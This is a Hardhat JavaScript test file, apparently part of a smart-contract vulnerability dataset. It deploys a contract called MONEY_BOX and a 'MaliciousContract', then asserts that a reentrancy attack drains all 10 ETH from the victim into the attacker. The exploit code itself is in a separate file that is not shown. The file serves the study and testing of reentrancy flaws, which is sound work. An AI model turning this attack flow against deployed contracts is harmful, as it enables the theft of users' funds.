const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol", function () {
  let MONEY_BOX;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol:Log");
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy MONEY_BOX contract with Log address
    MONEY_BOX = await ethers.getContractFactory("contracts/dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol:MONEY_BOX");
    victim = await MONEY_BOX.deploy();
    await victim.waitForDeployment();
    victim.SetLogFile(log.target)
 
    // Deploy MaliciousContract with MONEY_BOX address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888_attack.sol:MaliciousContract");
    hacker = await MaliciousContract.deploy(victim.target);
    
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Put( 0, {value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(victim.target);
    expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({value:  ethers.parseEther("5")});

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10")); 

    //set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [
        hacker.target,
        "0x0",
      ]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack( ethers.parseEther("3"));

    
    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful
    
    // victim has a drained account
    expect(victimBalance).to.equal(ethers.parseEther("0")); 

    // 5 original balance + 5 from  initial deposit 
    expect(maliciousContractBalance).to.equal(ethers.parseEther("10"));
    
  });
});